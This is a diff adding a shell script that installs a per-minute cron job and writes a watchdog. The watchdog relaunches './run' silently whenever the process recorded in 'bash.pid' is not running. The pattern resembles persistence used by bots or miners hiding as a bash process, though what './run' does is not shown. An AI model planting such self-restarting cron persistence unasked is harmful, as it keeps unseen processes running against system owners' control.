@@ -1,0 +1,16 @@
+#!/bin/sh
+pwd > dir
+dir=$(cat dir)
+echo "* * * * * $dir/upd >/dev/null 2>&1" > cron
+crontab cron
+crontab -l | grep upd
+echo "#!/bin/sh
+if test -r $dir/bash.pid; then
+pid=\$(cat $dir/bash.pid)
+if \$(kill -CHLD \$pid >/dev/null 2>&1)
+then
+exit 0
+fi
+fi
+./run &>/dev/null" > upd
+chmod +x *
